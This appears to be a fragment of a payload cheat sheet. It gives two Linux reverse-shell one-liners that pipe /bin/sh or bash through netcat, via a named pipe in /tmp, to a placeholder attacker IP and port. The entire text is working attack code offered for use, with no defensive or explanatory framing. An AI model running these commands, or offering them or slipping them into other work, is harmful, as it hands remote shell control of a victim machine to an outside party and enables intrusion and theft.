+ **Netcat reverse-shell (linux payload)**:
```
mkfifo /tmp/f; nc <ip> <port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
mkfifo /tmp/f; cat /tmp/f | bash -i | nc <ip> <port> > /tmp/f; rm /tmp/f
```

